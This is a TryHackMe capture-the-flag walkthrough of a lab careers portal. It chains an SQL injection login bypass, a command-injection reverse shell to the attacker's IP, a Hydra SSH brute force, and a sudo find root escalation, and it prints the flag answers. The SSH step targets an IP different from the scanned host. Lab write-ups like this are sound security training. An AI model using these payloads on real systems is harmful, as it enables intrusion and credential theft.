# TryHackMe: Operation Promotion

**Category:** Web Exploitation / Full-Box CTF
**Tooling:** Nmap, dirsearch, netcat, hashcat, Hydra
**Techniques:** SQL injection authentication bypass, command injection reverse shell, credential harvesting via config disclosure, password mutation wordlist generation, SUID/sudo privilege escalation

---

## Overview

A solo penetration test against RecruitCorp's public-facing careers portal. The engagement chains together a SQL injection login bypass, an OS command injection to gain a reverse shell, credential harvesting from an exposed config file, password mutation to crack SSH access, and a sudo misconfiguration for full root privilege escalation.

---

## 1. Recon

**Nmap scan:**
```bash
nmap -sV -sC -A -p- 10.130.177.177
```

**Output:**
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-08-05 08:52 UTC
Nmap scan report for ip-10-130-177-177.eu-west-3.compute.internal (10.130.177.177)
Host is up (0.00036s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e8:f7:c2:3a:0c:7a:b7:58:e7:25:a8:b7:9e:3e:4f:f3 (ECDSA)
|_  256 e2:78:44:aa:cf:fc:3f:a0:55:82:9a:db:40:3a:76:83 (ED25519)
80/tcp  open  http        Apache httpd 2.4.58 ((Ubuntu))
|_http-title: RecruitCorp - Careers Portal
| http-robots.txt: 1 disallowed entry 
|_/admin/
|_http-server-header: Apache/2.4.58 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=8/5%OT=22%CT=1%CU=40198%PV=Y%DS=1%DC=T%G=Y%TM=6A72F
OS:9F0%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)SEQ(SP
OS:=107%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M2301ST11NW8%O2=M2301ST11N
OS:W8%O3=M2301NNT11NW8%O4=M2301ST11NW8%O5=M2301ST11NW8%O6=M2301ST11)WIN(W1=
OS:F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=
OS:M2301NNSNW8%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N
OS:)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=
OS:S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF
OS:=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=
OS:G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: -1s
| smb2-time: 
|   date: 2026-08-05T08:53:03
|_  start_date: N/A
|_nbstat: NetBIOS name: RECRUITCORP, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

TRACEROUTE (using port 554/tcp)
HOP RTT     ADDRESS
1   0.40 ms ip-10-130-177-177.eu-west-3.compute.internal (10.130.177.177)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.47 seconds
```

**Directory brute force:**
```bash
dirsearch -u 10.130.177.177
```

**Output:**
```
  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 11460

Output File: /root/reports/_10.130.177.177/_26-08-05_08-54-59.txt

Target: http://10.130.177.177/

[08:55:00] Starting: 
[08:55:02] 403 -  279B  - /.ht_wsr.txt
[08:55:02] 403 -  279B  - /.htaccess.bak1
[08:55:02] 403 -  279B  - /.htaccess.sample
[08:55:02] 403 -  279B  - /.htaccess.orig
[08:55:02] 403 -  279B  - /.htaccess.save
[08:55:02] 403 -  279B  - /.htaccess_orig
[08:55:02] 403 -  279B  - /.htaccess_sc
[08:55:02] 403 -  279B  - /.htaccess_extra
[08:55:02] 403 -  279B  - /.htaccessBAK
[08:55:02] 403 -  279B  - /.htaccessOLD
[08:55:02] 403 -  279B  - /.htaccessOLD2
[08:55:02] 403 -  279B  - /.htm
[08:55:02] 403 -  279B  - /.html
[08:55:02] 403 -  279B  - /.htpasswd_test
[08:55:02] 403 -  279B  - /.htpasswds
[08:55:02] 403 -  279B  - /.httr-oauth
[08:55:04] 403 -  279B  - /.php
[08:55:10] 301 -  316B  - /admin  ->  http://10.130.177.177/admin/
[08:55:11] 200 -  499B  - /admin/
[08:55:12] 200 -  499B  - /admin/index.php
[08:55:27] 403 -  279B  - /config
[08:55:27] 403 -  279B  - /config/app.yml
[08:55:27] 403 -  279B  - /config/
[08:55:27] 403 -  279B  - /config/app.php
[08:55:27] 403 -  279B  - /config/banned_words.txt
[08:55:27] 403 -  279B  - /config/databases.yml
[08:55:27] 403 -  279B  - /config/autoload/
[08:55:27] 403 -  279B  - /config/config.ini
[08:55:27] 403 -  279B  - /config/database.yml
[08:55:27] 403 -  279B  - /config/db.inc
[08:55:27] 403 -  279B  - /config/aws.yml
[08:55:27] 403 -  279B  - /config/AppData.config
[08:55:27] 403 -  279B  - /config/apc.php
[08:55:27] 403 -  279B  - /config/database.yml.sqlite3
[08:55:27] 403 -  279B  - /config/database.yml~
[08:55:27] 403 -  279B  - /config/database.yml.pgsql
[08:55:27] 403 -  279B  - /config/monkid.ini
[08:55:27] 403 -  279B  - /config/settings.inc
[08:55:27] 403 -  279B  - /config/settings.ini
[08:55:27] 403 -  279B  - /config/initializers/secret_token.rb
[08:55:27] 403 -  279B  - /config/settings/production.yml
[08:55:27] 403 -  279B  - /config/monkcheckout.ini
[08:55:27] 403 -  279B  - /config/master.key
[08:55:27] 403 -  279B  - /config/monkdonate.ini
[08:55:27] 403 -  279B  - /config/config.inc
[08:55:27] 403 -  279B  - /config/settings.ini.cfm
[08:55:27] 403 -  279B  - /config/producao.ini
[08:55:27] 403 -  279B  - /config/routes.yml
[08:55:27] 403 -  279B  - /config/site.php
[08:55:27] 403 -  279B  - /config/settings.local.yml
[08:55:27] 403 -  279B  - /config/development/
[08:55:27] 403 -  279B  - /config/xml/
[08:56:02] 200 -   32B  - /robots.txt
[08:56:04] 403 -  279B  - /server-status
[08:56:04] 403 -  279B  - /server-status/

Task Completed
```

Found an accessible `/admin/` login panel (despite being disallowed in robots.txt) and a `403`-protected `/config/` directory hinting at sensitive files worth pursuing later.

---

## 2. Investigation

### Q1 — Content of user.txt

**Step 1 — SQL injection login bypass**

The admin login form was vulnerable to a classic SQLi bypass:
```
admin' OR '1'='1' --
```

**Step 2 — Command injection to reverse shell**

Found a `host=` parameter in the admin panel vulnerable to OS command injection. Set up a listener:
```bash
nc -lvnp 4444
```

Sent the payload:
```
host=127.0.0.1;bash+-c+'bash+-i+>%26+/dev/tcp/<10.130.93.97>/4444+0>%261'
```

Gained a shell as `www-data`.

**Step 3 — Credential harvesting from exposed config**

```bash
www-data@recruitcorp:/var/www/html/config$ cat db.conf
```
```
# RecruitCorp application database config
# Pulled out of source control - DO NOT COMMIT.
db_host=localhost
db_name=recruitcorp
db_user=jford
db_pass_hash=$2b$10$QzkXmGndA2cQLozO3xAN6eWKrl6ZXyzhYTJNF67exOmTmN5oVSEfq
db_engine=sqlite3
```

This confirmed a real system user, `jford`, and revealed a bcrypt password hash (not directly crackable in reasonable time, but useful context).

**Step 4 — Building a targeted wordlist**

The site referenced a seasonal base password pattern (`spring2026`). Used **hashcat** with the `dive.rule` mutation ruleset to generate likely password variants:

```bash
echo "spring2026" > base.txt
hashcat --stdout base.txt -r /usr/share/hashcat/rules/dive.rule > wordlist.txt
```

**Step 5 — Brute-forcing SSH with the generated wordlist**

```bash
hydra -l jford -P wordlist.txt 10.129.143.145 ssh -t 4
```

**Output:**
```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-05 09:30:42
[DATA] max 4 tasks per 1 server, overall 4 tasks, 99000 login tries (l:1/p:99000), ~24750 tries per task
[DATA] attacking ssh://10.129.143.145:22/
[STATUS] 36.00 tries/min, 36 tries in 00:01h, 98964 to do in 45:50h, 4 active
[STATUS] 28.00 tries/min, 84 tries in 00:03h, 98916 to do in 58:53h, 4 active
[22][ssh] host: 10.129.143.145   login: jford   password: spring2026!
1 of 1 target successfully completed, 1 valid password found
```

Result:
```
[22][ssh] host: 10.129.143.145   login: jford   password: spring2026!
```

Logged in via SSH as `jford` and retrieved `user.txt`.

**Answer:**
```
THM{bdbee0a91ebcb0b0fafde931223efe09}
```

---

### Q2 — Content of flag.txt

**Privilege escalation**

Required external research to identify the escalation path. Found that `jford` had passwordless sudo rights over `find`, a well-known GTFOBins privilege escalation vector:

```bash
sudo /usr/bin/find . -exec /bin/sh \; -quit
```

This dropped into a root shell. Navigated to `/root` and retrieved the final flag:

```bash
cd /root
cat flag.txt
```

**Answer:**
```
THM{d999a1f6319a9c5b48c067dfab314ba2}
```

---

## Key Lesson

This box is a strong full-chain example: authentication bypass (SQLi) → remote code execution (command injection) → lateral credential discovery (a config file "pulled out of source control" but left readable on the live server) → intelligent password cracking (mutating a known base password with hashcat rules rather than blind dictionary brute-forcing) → classic GTFOBins privilege escalation via `find`. The `db.conf` comment — "DO NOT COMMIT" — is a good reminder that files explicitly meant to stay out of version control are exactly the ones attackers look for once they gain any foothold, since developers often forget to also exclude them from the deployed application directory.
